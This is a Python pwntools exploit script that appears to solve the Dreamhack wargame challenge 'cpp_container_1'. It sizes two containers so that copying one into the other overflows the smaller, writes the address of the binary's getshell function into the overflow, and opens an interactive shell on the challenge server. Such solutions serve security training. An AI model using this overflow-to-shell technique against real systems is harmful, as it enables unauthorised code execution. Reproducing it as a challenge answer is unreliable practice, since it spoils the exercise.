#!/usr/bin/env python3

from pwn import *

exe = ELF("./cpp_container_1")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 11219)

    return r


def main():
    r = conn()

    getshell = exe.symbols["_Z8getshellv"]
    src_size = 10
    dst_size = 3

    r.sendlineafter(b"select menu: ", b"2")
    r.sendlineafter(b"Input container1 size\n", str(src_size).encode())
    r.sendlineafter(b"Input container2 size\n", str(dst_size).encode())

    r.sendlineafter(b"select menu: ", b"1")
    for i in range(src_size // 2):
        r.sendlineafter(b"input: ", str(getshell & 0xFFFFFFFF).encode())
        r.sendlineafter(b"input: ", str((getshell >> 32) & 0xFFFF).encode())
    for i in range(dst_size):
        r.sendlineafter(b"input: ", b"1111")
    
    r.sendlineafter(b"select menu: ", b"3")

    r.interactive()


if __name__ == "__main__":
    main()